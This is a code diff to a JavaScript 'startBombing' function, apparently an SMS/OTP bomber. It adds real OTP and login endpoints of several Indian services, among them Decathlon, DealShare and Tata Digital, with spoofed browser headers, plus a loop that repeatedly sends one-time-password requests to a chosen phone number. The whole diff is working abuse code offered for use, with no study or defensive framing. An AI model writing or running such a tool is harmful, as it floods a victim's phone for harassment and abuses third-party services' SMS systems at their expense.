@@ -96,24 +96,101 @@ function getHTMLForm() {
 async function startBombing(number, countNumber) {
   let currentCount = 0;
 
-  // Example API call (replace with your actual endpoints)
+  // Array of API endpoints to bomb
   const bombEndpoints = [
     {
       url: 'https://www.medibuddy.in/unified-login/user/register',
       data: JSON.stringify({ phonenumber: number }),
       headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
     },
-    // Add more endpoints here as needed
+    {
+      url: 'https://api.krishify.com/api/v1/auth/phone-login/generate',
+      data: JSON.stringify({ phone_number: number, name: 'Tetu Mama' }),
+      headers: {
+        'Host': 'api.krishify.com',
+        'Content-Length': '48',
+        'Accept-Language': 'hi',
+        'App-Name': 'KRISHIFY-DEALS',
+        'Content-Type': 'application/json',
+        'Accept': 'application/json, text/plain, */*',
+        'App-Version-Code': '320',
+        'Origin': 'https://deals.krishify.com',
+        'Referer': 'https://deals.krishify.com/',
+        'Accept-Encoding': 'gzip, deflate, br',
+      },
+    },
+    {
+      url: 'https://www.dealshare.in/api/1.0/get-otp',
+      data: JSON.stringify({ phoneNumber: number }),
+      headers: {
+        'Host': 'www.dealshare.in',
+        'Accept': 'application/json, text/plain, */*',
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.54 Safari/537.36',
+        'Origin': 'https://www.dealshare.in',
+        'Referer': 'https://www.dealshare.in/',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9',
+      },
+    },
+    {
+      url: 'https://www.decathlon.in/api/login/sendotp',
+      data: JSON.stringify({ param: number, source: 1 }),
+      headers: {
+        'Host': 'www.decathlon.in',
+        'Accept': 'application/json, text/plain, */*',
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36',
+        'Origin': 'https://www.decathlon.in',
+        'Referer': 'https://www.decathlon.in/',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9',
+      },
+    },
+    {
+      url: `https://ullu.app/ulluCore/api/v1/otp/send/new/cdiOpn?mobileNumber=${number}`,
+      data: `mobileNumber=${number}`,
+      headers: {
+        'Host': 'ullu.app',
+        'Content-Length': '0',
+        'Accept': 'application/json, text/plain, */*',
+        'Origin': 'https://ullu.app',
+        'Referer': 'https://ullu.app/',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Content-Type': 'application/x-www-form-urlencoded',
+      },
+    },
+    {
+      url: 'https://api.tatadigital.com/api/v2/sso/check-phone',
+      data: JSON.stringify({ countryCode: '91', phone: number, sendOtp: true }),
+      headers: {
+        'Host': 'api.tatadigital.com',
+        'Content-Length': '56',
+        'Accept': '*/*',
+        'Client_Id': 'WESTSIDE-WEB-APP',
+        'Content-Type': 'application/json',
+        'Origin': 'https://www.westside.com',
+        'Referer': 'https://www.westside.com/',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Accept-Language': 'en-US,en;q=0.9',
+      },
+    },
   ];
 
+  // Loop through the count and send requests to all endpoints
   for (let i = 0; i < countNumber; i++) {
     for (const endpoint of bombEndpoints) {
-      await fetch(endpoint.url, {
-        method: 'POST',
-        headers: endpoint.headers,
-        body: endpoint.data,
-      });
-      currentCount++;
+      try {
+        await fetch(endpoint.url, {
+          method: 'POST',
+          headers: endpoint.headers,
+          body: endpoint.data,
+        });
+        currentCount++;
+      } catch (error) {
+        console.error(`Error with ${endpoint.url}: ${error}`);
+      }
     }
   }
 
